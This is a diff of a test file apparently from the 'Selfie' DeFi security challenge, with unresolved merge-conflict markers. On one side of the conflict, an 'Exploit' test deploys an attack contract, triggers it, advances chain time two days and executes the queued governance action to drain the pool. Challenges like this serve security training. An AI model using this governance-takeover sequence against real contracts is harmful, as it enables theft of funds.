@@ -37,8 +37,17 @@ describe('[Challenge] Selfie', function () {
 
     });
 
+<<<<<<< Updated upstream
     it('Execution', async function () {
         /** CODE YOUR SOLUTION HERE */
+=======
+    it('Exploit', async function () {
+        const attackFactory = await ethers.getContractFactory('selfieAttack', attacker);
+        const attackContract = await attackFactory.deploy(this.pool.address, this.governance.address, this.token.address);
+        await attackContract.attack();
+        await ethers.provider.send("evm_increaseTime", [2 * 24 * 60 * 60]);
+        await this.governance.executeAction(await attackContract.actionId());
+>>>>>>> Stashed changes
     });
 
     after(async function () {
